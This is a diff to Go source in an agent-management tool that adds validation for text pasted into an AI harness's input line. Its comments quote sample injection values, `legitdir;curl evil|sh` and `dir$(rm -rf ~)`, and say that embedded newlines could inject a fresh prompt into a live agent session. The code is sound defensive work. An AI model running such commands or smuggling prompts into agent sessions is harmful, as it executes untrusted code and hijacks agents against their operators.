@@ -8,6 +8,8 @@ import (
 	"os/exec"
 	"strings"
 	"time"
+
+	"github.com/vbonnet/dear-agent/agm/internal/harnessexec"
 )
 
 // Known harness names. Active parity harnesses come first; deprecated harnesses
@@ -289,7 +291,7 @@ func min3(a, b, c int) int {
 // ValidateSendDirPath rejects paths that, when interpolated into a
 // `cd %s\r` string and pasted into a tmux pane (which forwards bytes
 // verbatim to the pane's shell), would let the operator execute arbitrary
-// commands. The path arrives via the generic Agent.ExecuteCommand
+// commands. The path arrives via the concrete adapter's ExecuteCommand
 // interface (MCP server, workflow, supervisor) so the project's threat
 // model treats it as hostile. A value like `legitdir;curl evil|sh` or
 // `dir$(rm -rf ~)` would otherwise produce shell injection; embedded
@@ -308,4 +310,25 @@ func ValidateSendDirPath(p string) error {
 		}
 	}
 	return nil
+}
+
+// ValidateSendKeysText rejects text destined for a harness's own TUI input
+// line — `/rename <name>`, `/chat save <name>` — rather than for a shell.
+//
+// The distinction matters. ValidateSendDirPath guards a string a shell will
+// parse, so it denies shell metacharacters. Here the parser is the agent's
+// input widget, where `'` and `$` are ordinary characters and shell-quoting
+// would be a bug: the quotes would land verbatim in the session title. The
+// only dangerous class is the line terminator. A `\r` or `\n` submits the line
+// early and injects everything after it as a fresh prompt into a live agent
+// session — prompt injection rather than command execution, and still a hole.
+//
+// Printable text is allowed unchanged, including spaces, quotes and non-ASCII,
+// because a session title is human-facing prose and mangling it would be its
+// own regression. kind names the field for the error message.
+func ValidateSendKeysText(kind, s string) error {
+	if s == "" {
+		return fmt.Errorf("%s is empty", kind)
+	}
+	return harnessexec.ValidatePastedText(kind, s)
 }
